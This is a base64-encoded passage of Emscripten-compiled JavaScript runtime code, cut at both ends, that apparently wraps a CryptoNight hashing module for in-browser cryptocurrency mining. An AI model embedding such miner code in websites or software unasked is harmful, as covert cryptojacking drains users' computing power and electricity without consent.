ldCgpLAogICAgICAgICAgICByZXN1bHQgPSBTWVNDQUxMUy5nZXQoKSwgd2hlbmNlID0gU1lTQ0FMTFMuZ2V0KCk7CiAgICAgICAgdmFyIG9mZnNldCA9IG9mZnNldF9sb3c7CiAgICAgICAgRlMubGxzZWVrKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpOwogICAgICAgIEhFQVAzMltyZXN1bHQgPj4gMl0gPSBzdHJlYW0ucG9zaXRpb247CiAgICAgICAgaWYoc3RyZWFtLmdldGRlbnRzICYmIG9mZnNldCA9PT0gMCAmJiB3aGVuY2UgPT09IDApIHN0cmVhbS5nZXRkZW50cyA9IG51bGw7CiAgICAgICAgcmV0dXJuIDAKICAgIH0gY2F0Y2goZSkgewogICAgICAgIGlmKHR5cGVvZiBGUyA9PT0gInVuZGVmaW5lZCIgfHwgIShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpIGFib3J0KGUpOwogICAgICAgIHJldHVybiAtZS5lcnJubwogICAgfQp9CgpmdW5jdGlvbiBfX19zeXNjYWxsMTQ2KHdoaWNoLCB2YXJhcmdzKSB7CiAgICBTWVNDQUxMUy52YXJhcmdzID0gdmFyYXJnczsKICAgIHRyeSB7CiAgICAgICAgdmFyIHN0cmVhbSA9IFNZU0NBTExTLmdldFN0cmVhbUZyb21GRCgpLCBpb3YgPSBTWVNDQUxMUy5nZXQoKSwgaW92Y250ID0gU1lTQ0FMTFMuZ2V0KCk7CiAgICAgICAgcmV0dXJuIFNZU0NBTExTLmRvV3JpdGV2KHN0cmVhbSwgaW92LCBpb3ZjbnQpCiAgICB9IGNhdGNoKGUpIHsKICAgICAgICBpZih0eXBlb2YgRlMgPT09ICJ1bmRlZmluZWQiIHx8ICEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKSBhYm9ydChlKTsKICAgICAgICByZXR1cm4gLWUuZXJybm8KICAgIH0KfQoKZnVuY3Rpb24gX19fc3lzY2FsbDU0KHdoaWNoLCB2YXJhcmdzKSB7CiAgICBTWVNDQUxMUy52YXJhcmdzID0gdmFyYXJnczsKICAgIHRyeSB7CiAgICAgICAgdmFyIHN0cmVhbSA9IFNZU0NBTExTLmdldFN0cmVhbUZyb21GRCgpLCBvcCA9IFNZU0NBTExTLmdldCgpOwogICAgICAgIHN3aXRjaChvcCkgewogICAgICAgICAgICBjYXNlIDIxNTA1OiB7CiAgICAgICAgICAgICAgICBpZighc3RyZWFtLnR0eSkgcmV0dXJuIC1FUlJOT19DT0RFUy5FTk9UVFk7CiAgICAgICAgICAgICAgICByZXR1cm4gMAogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA7CiAgICAgICAgICAgIGNhc2UgMjE1MDY6IHsKICAgICAgICAgICAgICAgIGlmKCFzdHJlYW0udHR5KSByZXR1cm4gLUVSUk5PX0NPREVTLkVOT1RUWTsKICAgICAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgY2FzZSAyMTUxOTogewogICAgICAgICAgICAgICAgaWYoIXN0cmVhbS50dHkpIHJldHVybiAtRVJSTk9fQ09ERVMuRU5PVFRZOwogICAgICAgICAgICAgICAgdmFyIGFyZ3AgPSBTWVNDQUxMUy5nZXQoKTsKICAgICAgICAgICAgICAgIEhFQVAzMlthcmdwID4+IDJdID0gMDsKICAgICAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgY2FzZSAyMTUyMDogewogICAgICAgICAgICAgICAgaWYoIXN0cmVhbS50dHkpIHJldHVybiAtRVJSTk9fQ09ERVMuRU5PVFRZOwogICAgICAgICAgICAgICAgcmV0dXJuIC1FUlJOT19DT0RFUy5FSU5WQUwKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgOwogICAgICAgICAgICBjYXNlIDIxNTMxOiB7CiAgICAgICAgICAgICAgICB2YXIgYXJncCA9IFNZU0NBTExTLmdldCgpOwogICAgICAgICAgICAgICAgcmV0dXJuIEZTLmlvY3RsKHN0cmVhbSwgb3AsIGFyZ3ApCiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgY2FzZSAyMTUyMzogewogICAgICAgICAgICAgICAgaWYoIXN0cmVhbS50dHkpIHJldHVybiAtRVJSTk9fQ09ERVMuRU5PVFRZOwogICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgYWJvcnQoImJhZCBpb2N0bCBzeXNjYWxsICIgKyBvcCkKICAgICAgICB9CiAgICB9IGNhdGNoKGUpIHsKICAgICAgICBpZih0eXBlb2YgRlMgPT09ICJ1bmRlZmluZWQiIHx8ICEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKSBhYm9ydChlKTsKICAgICAgICByZXR1cm4gLWUuZXJybm8KICAgIH0KfQoKRlMuc3RhdGljSW5pdCgpOwpfX0FUSU5JVF9fLnVuc2hpZnQoKGZ1bmN0aW9uKCkgewogICAgaWYoIU1vZHVsZVsibm9GU0luaXQiXSAmJiAhRlMuaW5pdC5pbml0aWFsaXplZCkgRlMuaW5pdCgpCn0pKTsKX19BVE1BSU5fXy5wdXNoKChmdW5jdGlvbigpIHsKICAgIEZTLmlnbm9yZVBlcm1pc3Npb25zID0gZmFsc2UKfSkpOwpfX0FURVhJVF9fLnB1c2goKGZ1bmN0aW9uKCkgewogICAgRlMucXVpdCgpCn0pKTsKTW9kdWxlWyJGU19jcmVhdGVGb2xkZXIiXSA9IEZTLmNyZWF0ZUZvbGRlcjsKTW9kdWxlWyJGU19jcmVhdGVQYXRoIl0gPSBGUy5jcmVhdGVQYXRoOwpNb2R1bGVbIkZTX2NyZWF0ZURhdGFGaWxlIl0gPSBGUy5jcmVhdGVEYXRhRmlsZTsKTW9kdWxlWyJGU19jcmVhdGVQcmVsb2FkZWRGaWxlIl0gPSBGUy5jcmVhdGVQcmVsb2FkZWRGaWxlOwpNb2R1bGVbIkZTX2NyZWF0ZUxhenlGaWxlIl0gPSBGUy5jcmVhdGVMYXp5RmlsZTsKTW9kdWxlWyJGU19jcmVhdGVMaW5rIl0gPSBGUy5jcmVhdGVMaW5rOwpNb2R1bGVbIkZTX2NyZWF0ZURldmljZSJdID0gRlMuY3JlYXRlRGV2aWNlOwpNb2R1bGVbIkZTX3VubGluayJdID0gRlMudW5saW5rOwpfX0FUSU5JVF9fLnVuc2hpZnQoKGZ1bmN0aW9uKCkgewogICAgVFRZLmluaXQoKQp9KSk7Cl9fQVRFWElUX18ucHVzaCgoZnVuY3Rpb24oKSB7CiAgICBUVFkuc2h1dGRvd24oKQp9KSk7CmlmKEVOVklST05NRU5UX0lTX05PREUpIHsKICAgIHZhciBmcyA9IHJlcXVpcmUoImZzIik7CiAgICB2YXIgTk9ERUpTX1BBVEggPSByZXF1aXJlKCJwYXRoIik7CiAgICBOT0RFRlMuc3RhdGljSW5pdCgpCn0KRFlOQU1JQ1RPUF9QVFIgPSBhbGxvY2F0ZSgxLCAiaTMyIiwgQUxMT0NfU1RBVElDKTsKU1RBQ0tfQkFTRSA9IFNUQUNLVE9QID0gUnVudGltZS5hbGlnbk1lbW9yeShTVEFUSUNUT1ApOwpTVEFDS19NQVggPSBTVEFDS19CQVNFICsgVE9UQUxfU1RBQ0s7CkRZTkFNSUNfQkFTRSA9IFJ1bnRpbWUuYWxpZ25NZW1vcnkoU1RBQ0tfTUFYKTsKSEVBUDMyW0RZTkFNSUNUT1BfUFRSID4+IDJdID0gRFlOQU1JQ19CQVNFOwpzdGF0aWNTZWFsZWQgPSB0cnVlOwpNb2R1bGVbIndhc21UYWJsZVNpemUiXSA9IDE0OwpNb2R1bGVbIndhc21NYXhUYWJsZVNpemUiXSA9IDE0OwoKZnVuY3Rpb24gaW52b2tlX2lpKGluZGV4LCBhMSkgewogICAgdHJ5IHsKICAgICAgICByZXR1cm4gTW9kdWxlWyJkeW5DYWxsX2lpIl0oaW5kZXgsIGExKQogICAgfSBjYXRjaChlKSB7CiAgICAgICAgaWYodHlwZW9mIGUgIT09ICJudW1iZXIiICYmIGUgIT09ICJsb25nam1wIikgdGhyb3cgZTsKICAgICAgICBNb2R1bGVbInNldFRocmV3Il0oMSwgMCkKICAgIH0KfQoKZnVuY3Rpb24gaW52b2tlX2lpaWkoaW5kZXgsIGExLCBhMiwgYTMpIHsKICAgIHRyeSB7CiAgICAgICAgcmV0dXJuIE1vZHVsZVsiZHluQ2FsbF9paWlpIl0oaW5kZXgsIGExLCBhMiwgYTMpCiAgICB9IGNhdGNoKGUpIHsKICAgICAgICBpZih0eXBlb2YgZSAhPT0gIm51bWJlciIgJiYgZSAhPT0gImxvbmdqbXAiKSB0aHJvdyBlOwogICAgICAgIE1vZHVsZVsic2V0VGhyZXciXSgxLCAwKQogICAgfQp9CgpmdW5jdGlvbiBpbnZva2VfdmlpaShpbmRleCwgYTEsIGEyLCBhMykgewogICAgdHJ5IHsKICAgICAgICBNb2R1bGVbImR5bkNhbGxfdmlpaSJdKGluZGV4LCBhMSwgYTIsIGEzKQogICAgfSBjYXRjaChlKSB7CiAgICAgICAgaWYodHlwZW9mIGUgIT09ICJudW1iZXIiICYmIGUgIT09ICJsb25nam1wIikgdGhyb3cgZTsKICAgICAgICBNb2R1bGVbInNldFRocmV3Il0oMSwgMCkKICAgIH0KfQoKTW9kdWxlLmFzbUdsb2JhbEFyZyA9IHsKICAgICJNYXRoIjogTWF0aCwKICAgICJJbnQ4QXJyYXkiOiBJbnQ4QXJyYXksCiAgICAiSW50MTZBcnJheSI6IEludDE2QXJyYXksCiAgICAiSW50MzJBcnJheSI6IEludDMyQXJyYXksCiAgICAiVWludDhBcnJheSI6IFVpbnQ4QXJyYXksCiAgICAiVWludDE2QXJyYXkiOiBVaW50MTZBcnJheSwKICAgICJVaW50MzJBcnJheSI6IFVpbnQzMkFycmF5LAogICAgIkZsb2F0MzJBcnJheSI6IEZsb2F0MzJBcnJheSwKICAgICJGbG9hdDY0QXJyYXkiOiBGbG9hdDY0QXJyYXksCiAgICAiTmFOIjogTmFOLAogICAgIkluZmluaXR5IjogSW5maW5pdHkKfTsKTW9kdWxlLmFzbUxpYnJhcnlBcmcgPSB7CiAgICAiYWJvcnQiOiBhYm9ydCwKICAgICJhc3NlcnQiOiBhc3NlcnQsCiAgICAiZW5sYXJnZU1lbW9yeSI6IGVubGFyZ2VNZW1vcnksCiAgICAiZ2V0VG90YWxNZW1vcnkiOiBnZXRUb3RhbE1lbW9yeSwKICAgICJhYm9ydE9uQ2Fubm90R3Jvd01lbW9yeSI6IGFib3J0T25DYW5ub3RHcm93TWVtb3J5LAogICAgImludm9rZV9paSI6IGludm9rZV9paSwKICAgICJpbnZva2VfaWlpaSI6IGludm9rZV9paWlpLAogICAgImludm9rZV92aWlpIjogaW52b2tlX3ZpaWksCiAgICAiX2dtdGltZV9yIjogX2dtdGltZV9yLAogICAgIl9nbXRpbWUiOiBfZ210aW1lLAogICAgIl9fX2xvY2siOiBfX19sb2NrLAogICAgIl9fX3N5c2NhbGw2IjogX19fc3lzY2FsbDYsCiAgICAiX19fc2V0RXJyTm8iOiBfX19zZXRFcnJObywKICAgICJfX191bmxvY2siOiBfX191bmxvY2ssCiAgICAiX2Z0aW1lIjogX2Z0aW1lLAogICAgIl9lbXNjcmlwdGVuX21lbWNweV9iaWciOiBfZW1zY3JpcHRlbl9tZW1jcHlfYmlnLAogICAgIl9fX3N5c2NhbGw1NCI6IF9fX3N5c2NhbGw1NCwKICAgICJfX19zeXNjYWxsMTQwIjogX19fc3lzY2FsbDE0MCwKICAgICJfX19zeXNjYWxsMjAiOiBfX19zeXNjYWxsMjAsCiAgICAiX19fYXNzZXJ0X2ZhaWwiOiBfX19hc3NlcnRfZmFpbCwKICAgICJfX19zeXNjYWxsMTQ2IjogX19fc3lzY2FsbDE0NiwKICAgICJEWU5BTUlDVE9QX1BUUiI6IERZTkFNSUNUT1BfUFRSLAogICAgInRlbXBEb3VibGVQdHIiOiB0ZW1wRG91YmxlUHRyLAogICAgIkFCT1JUIjogQUJPUlQsCiAgICAiU1RBQ0tUT1AiOiBTVEFDS1RPUCwKICAgICJTVEFDS19NQVgiOiBTVEFDS19NQVgKfTsKdmFyIGFzbSA9IE1vZHVsZVsiYXNtIl0oTW9kdWxlLmFzbUdsb2JhbEFyZywgTW9kdWxlLmFzbUxpYnJhcnlBcmcsIGJ1ZmZlcik7Ck1vZHVsZVsiYXNtIl0gPSBhc207CnZhciBfY3J5cHRvbmlnaHRfaGFzaCA9IE1vZHVsZVsiX2NyeXB0b25pZ2h0X2hhc2giXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfY3J5cHRvbmlnaHRfaGFzaCJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBnZXRUZW1wUmV0MCA9IE1vZHVsZVsiZ2V0VGVtcFJldDAiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJnZXRUZW1wUmV0MCJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfZnJlZSA9IE1vZHVsZVsiX2ZyZWUiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfZnJlZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBydW5Qb3N0U2V0cyA9IE1vZHVsZVsicnVuUG9zdFNldHMiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJydW5Qb3N0U2V0cyJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBzZXRUZW1wUmV0MCA9IE1vZHVsZVsic2V0VGVtcFJldDAiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJzZXRUZW1wUmV0MCJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBlc3RhYmxpc2hTdGFja1NwYWNlID0gTW9kdWxlWyJlc3RhYmxpc2hTdGFja1NwYWNlIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiZXN0YWJsaXNoU3RhY2tTcGFjZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfbWVtbW92ZSA9IE1vZHVsZVsiX21lbW1vdmUiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfbWVtbW92ZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBzdGFja1NhdmUgPSBNb2R1bGVbInN0YWNrU2F2ZSJdID0gKGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIE1vZHVsZVsiYXNtIl1bInN0YWNrU2F2ZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfbWVtc2V0ID0gTW9kdWxlWyJfbWVtc2V0Il0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiX21lbXNldCJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfbWFsbG9jID0gTW9kdWxlWyJfbWFsbG9jIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiX21hbGxvYyJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfY3J5cHRvbmlnaHRfY3JlYXRlID0gTW9kdWxlWyJfY3J5cHRvbmlnaHRfY3JlYXRlIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiX2NyeXB0b25pZ2h0X2NyZWF0ZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfbWVtY3B5ID0gTW9kdWxlWyJfbWVtY3B5Il0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiX21lbWNweSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfZW1zY3JpcHRlbl9nZXRfZ2xvYmFsX2xpYmMgPSBNb2R1bGVbIl9lbXNjcmlwdGVuX2dldF9nbG9iYWxfbGliYyJdID0gKGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIE1vZHVsZVsiYXNtIl1bIl9lbXNjcmlwdGVuX2dldF9nbG9iYWxfbGliYyJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBzdGFja0FsbG9jID0gTW9kdWxlWyJzdGFja0FsbG9jIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsic3RhY2tBbGxvYyJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBzZXRUaHJldyA9IE1vZHVsZVsic2V0VGhyZXciXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJzZXRUaHJldyJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfc2JyayA9IE1vZHVsZVsiX3NicmsiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfc2JyayJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfZmZsdXNoID0gTW9kdWxlWyJfZmZsdXNoIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiX2ZmbHVzaCJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBzdGFja1Jlc3RvcmUgPSBNb2R1bGVbInN0YWNrUmVzdG9yZSJdID0gKGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIE1vZHVsZVsiYXNtIl1bInN0YWNrUmVzdG9yZSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfY3J5cHRvbmlnaHRfZGVzdHJveSA9IE1vZHVsZVsiX2NyeXB0b25pZ2h0X2Rlc3Ryb3kiXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfY3J5cHRvbmlnaHRfZGVzdHJveSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBfX19lcnJub19sb2NhdGlvbiA9IE1vZHVsZVsiX19fZXJybm9fbG9jYXRpb24iXSA9IChmdW5jdGlvbigpIHsKICAgIHJldHVybiBNb2R1bGVbImFzbSJdWyJfX19lcnJub19sb2NhdGlvbiJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBkeW5DYWxsX2lpID0gTW9kdWxlWyJkeW5DYWxsX2lpIl0gPSAoZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gTW9kdWxlWyJhc20iXVsiZHluQ2FsbF9paSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBkeW5DYWxsX2lpaWkgPSBNb2R1bGVbImR5bkNhbGxfaWlpaSJdID0gKGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIE1vZHVsZVsiYXNtIl1bImR5bkNhbGxfaWlpaSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7CnZhciBkeW5DYWxsX3ZpaWkgPSBNb2R1bGVbImR5bkNhbGxfdmlpaSJdID0gKGZ1bmN0aW9uKCkgewogICAgcmV0dXJuIE1vZHVsZVsiYXNtIl1bImR5bkNhbGxfdmlpaSJdLmFwcGx5KG51bGwsIGFyZ3VtZW50cykKfSk7ClJ1bnRpbWUuc3RhY2tBbGxvYyA9IE1vZHVsZVsic3RhY2tBbGxvYyJdOwpSdW50aW1lLnN0YWNrU2F2ZSA9IE1vZHVsZVsic3RhY2tTYXZlIl07ClJ1bnRpbWUuc3RhY2tSZXN0b3JlID0gTW9kdWxlWyJzdGFja1Jlc3RvcmUiXTsKUnVudGltZS5lc3RhYmxpc2hTdGFja1NwYWNlID0gTW9kdWxlWyJlc3RhYmxpc2hTdGFja1NwYWNlIl07ClJ1bnRpbWUuc2V0VGVtcFJldDAgPSBNb2R1bGVbInNldFRlbXBSZXQwIl07ClJ1bnRpbWUuZ2V0VGVtcFJldDAgPSBNb2R1bGVbImdldFRlbXBSZXQwIl07Ck1vZHVsZVsiYXNtIl0gPSBhc207CmlmKG1lbW9yeUluaXRpYWxpemVyKSB7CiAgICBpZih0eXBlb2YgTW9kdWxlWyJsb2NhdGVGaWxlIl0gPT09ICJmdW5jdGlvbiIpIHsKICAgICAgICBtZW1vcnlJbml0aWFsaXplciA9IE1vZHVsZVsibG9jYXRlRmlsZSJdKG1lbW9yeUluaXRpYWxpemVyKQogICAgfSBlbHNlIGlmKE1vZHVsZVsibWVtb3J5SW5pdGlhbGl6ZXJQcmVmaXhVUkwiXSkgewogICAgICAgIG1lbW9yeUluaXRpYWxpemVyID0gTW9kdWxlWyJtZW1vcnlJbml0aWFsaXplclByZWZpeFVSTCJdICsgbWVtb3J5SW5pdGlhbGl6ZXIKICAgIH0KICAgIGlmKEVOVklST05NRU5UX0lTX05PREUgfHwgRU5WSVJPTk1FTlRfSVNfU0hFTEwpIHsKICAgICAgICB2YXIgZGF0YSA9IE1vZHVsZVsicmVhZEJpbmFyeSJdKG1lbW9yeUluaXRpYWxpemVyKTsKICAgICAgICBIRUFQVTguc2V0KGRhdGEsIFJ1bnRpbWUuR0xPQkFMX0JBU0UpCiAgICB9IGVsc2UgewogICAgICAgIGFkZFJ1bkRlcGVuZGVuY3koIm1lbW9yeSBpbml0aWFsaXplciIpOwogICAgICAgIHZhciBhcHBseU1lbW9yeUluaXRpYWxpemVyID0gKGZ1bmN0aW9uKGRhdGEpIHsKICAgICAgICAgICAgaWYoZGF0YS5ieXRlTGVuZ3RoKSBkYXRhID0gbmV3IFVpbnQ4QXJyYXkoZGF0YSk7CiAgICAgICAgICAgIEhFQVBVOC5zZXQoZGF0YSwgUnVudGltZS5HTE9CQUxfQkFTRSk7CiAgICAgICAgICAgIGlmKE1vZHVsZVsibWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0Il0pIGRlbGV0ZSBNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLnJlc3BvbnNlOwogICAgICAgICAgICByZW1vdmVSdW5EZXBlbmRlbmN5KCJtZW1vcnkgaW5pdGlhbGl6ZXIiKQogICAgICAgIH0pOwoKICAgICAgICBmdW5jdGlvbiBkb0Jyb3dzZXJMb2FkKCkgewogICAgICAgICAgICBNb2R1bGVbInJlYWRBc3luYyJdKG1lbW9yeUluaXRpYWxpemVyLCBhcHBseU1lbW9yeUluaXRpYWxpemVyLCAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICB0aHJvdyJjb3VsZCBub3QgbG9hZCBtZW1vcnkgaW5pdGlhbGl6ZXIgIiArIG1lbW9yeUluaXRpYWxpemVyCiAgICAgICAgICAgIH0pKQogICAgICAgIH0KCiAgICAgICAgaWYoTW9kdWxlWyJtZW1vcnlJbml0aWFsaXplclJlcXVlc3QiXSkgewogICAgICAgICAgICBmdW5jdGlvbiB1c2VSZXF1ZXN0KCkgewogICAgICAgICAgICAgICAgdmFyIHJlcXVlc3QgPSBNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdOwogICAgICAgICAgICAgICAgaWYocmVxdWVzdC5zdGF0dXMgIT09IDIwMCAmJiByZXF1ZXN0LnN0YXR1cyAhPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUud2FybigiYSBwcm9ibGVtIHNlZW1zIHRvIGhhdmUgaGFwcGVuZWQgd2l0aCBNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0LCBzdGF0dXM6ICIgKyByZXF1ZXN0LnN0YXR1cyArICIsIHJldHJ5aW5nICIgKyBtZW1vcnlJbml0aWFsaXplcik7CiAgICAgICAgICAgICAgICAgICAgZG9Ccm93c2VyTG9hZCgpOwogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYXBwbHlNZW1vcnlJbml0aWFsaXplcihyZXF1ZXN0LnJlc3BvbnNlKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZihNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLnJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHVzZVJlcXVlc3QsIDApCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBNb2R1bGVbIm1lbW9yeUluaXRpYWxpemVyUmVxdWVzdCJdLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCB1c2VSZXF1ZXN0KQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZG9Ccm93c2VyTG9hZCgpCiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBFeGl0U3RhdHVzKHN0YXR1cykgewogICAgdGhpcy5uYW1lID0gIkV4aXRTdGF0dXMiOwogICAgdGhpcy5tZXNzYWdlID0gIlByb2dyYW0gdGVybWluYXRlZCB3aXRoIGV4aXQoIiArIHN0YXR1cyArICIpIjsKICAgIHRoaXMuc3RhdHVzID0gc3RhdHVzCn0KCkV4aXRTdGF0dXMucHJvdG90eXBlID0gbmV3IEVycm9yOwpFeGl0U3RhdHVzLnByb3RvdHlwZS5jb25zdHJ1Y3RvciA9IEV4aXRTdGF0dXM7CnZhciBpbml0aWFsU3RhY2tUb3A7CnZhciBwcmVsb2FkU3RhcnRUaW1lID0gbnVsbDsKdmFyIGNhbGxlZE1haW4gPSBmYWxzZTsKZGVwZW5kZW5jaWVzRnVsZmlsbGVkID0gZnVuY3Rpb24gcnVuQ2FsbGVyKCkgewogICAgaWYoIU1vZHVsZVsiY2FsbGVkUnVuIl0pIHJ1bigpOwogICAgaWYoIU1vZHVsZVsiY2FsbGVkUnVuIl0pIGRlcGVuZGVuY2llc0Z1bGZpbGxlZCA9IHJ1bkNhbGxlcgp9OwpNb2R1bGVbImNhbGxNYWluIl0gPSBNb2R1bGUuY2FsbE1haW4gPSBmdW5jdGlvbiBjYWxsTWFpbihhcmdzKSB7CiAgICBhcmdzID0gYXJncyB8fCBbXTsKICAgIGVuc3VyZUluaXRSdW50aW1lKCk7CiAgICB2YXIgYXJnYyA9IGFyZ3MubGVuZ3RoICsgMTsKCiAgICBmdW5jdGlvbiBwYWQoKSB7CiAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IDQgLSAxOyBpKyspIHsKICAgICAgICAgICAgYXJndi5wdXNoKDApCiAgICAgICAgfQogICAgfQoKICAgIHZhciBhcmd2ID0gW2FsbG9jYXRlKGludEFycmF5RnJvbVN0cmluZyhNb2R1bGVbInRoaXNQcm9ncmFtIl0pLCAiaTgiLCBBTExPQ19OT1JNQUwpXTsKICAgIHBhZCgpOwogICAgZm9yKHZhciBpID0gMDsgaSA8IGFyZ2MgLSAxOyBpID0gaSArIDEpIHsKICAgICAgICBhcmd2LnB1c2goYWxsb2NhdGUoaW50QXJyYXlGcm9tU3RyaW5nKGFyZ3NbaV0pLCAiaTgiLCBBTExPQ19OT1JNQUwpKTsKICAgICAgICBwYWQoKQogICAgfQogICAgYXJndi5wdXNoKDApOwogICAgYXJndiA9IGFsbG9jYXRlKGFyZ3YsICJpMzIiLCBBTExPQ19OT1JNQUwpOwogICAgdHJ5IHsKICAgICAgICB2YXIgcmV0ID0gTW9kdWxlWyJfbWFpbiJdKGFyZ2MsIGFyZ3YsIDApOwogICAgICAgIGV4aXQocmV0LCB0cnVlKQogICAgfSBjYXRjaChlKSB7CiAgICAgICAgaWYoZSBpbnN0YW5jZW9mIEV4aXRTdGF0dXMpIHsKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgfSBlbHNlIGlmKGUgPT0gIlNpbXVsYXRlSW5maW5pdGVMb29wIikgewogICAgICAgICAgICBNb2R1bGVbIm5vRXhpdFJ1bnRpbWUiXSA9IHRydWU7CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHZhciB0b0xvZyA9IGU7CiAgICAgICAgICAgIGlmKGUgJiYgdHlwZW9mIGUgPT09ICJvYmplY3QiICYmIGUuc3RhY2spIHsKICAgICAgICAgICAgICAgIHRvTG9nID0gW2UsIGUuc3RhY2tdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgTW9kdWxlLnByaW50RXJyKCJleGNlcHRpb24gdGhyb3duOiAiICsgdG9Mb2cpOwogICAgICAgICAgICBNb2R1bGVbInF1aXQiXSgxLCBlKQogICAgICAgIH0KICAgIH0gZmluYWxseSB7CiAgICAgICAgY2FsbGVkTWFpbiA9IHRydWUKICAgIH0KfTsKCmZ1bmN0aW9uIHJ1bihhcmdzKSB7CiAgICBhcmdzID0gYXJncyB8fCBNb2R1bGVbImFyZ3VtZW50cyJdOwogICAgaWYocHJlbG9hZFN0YXJ0VGltZSA9PT0gbnVsbCkgcHJlbG9hZFN0YXJ0VGltZSA9IERhdGUubm93KCk7CiAgICBpZihydW5EZXBlbmRlbmNpZXMgPiAwKSB7CiAgICAgICAgcmV0dXJuCiAgICB9CiAgICBwcmVSdW4oKTsKICAgIGlmKHJ1bkRlcGVuZGVuY2llcyA+IDApIHJldHVybjsKICAgIGlmKE1vZHVsZVsiY2Fs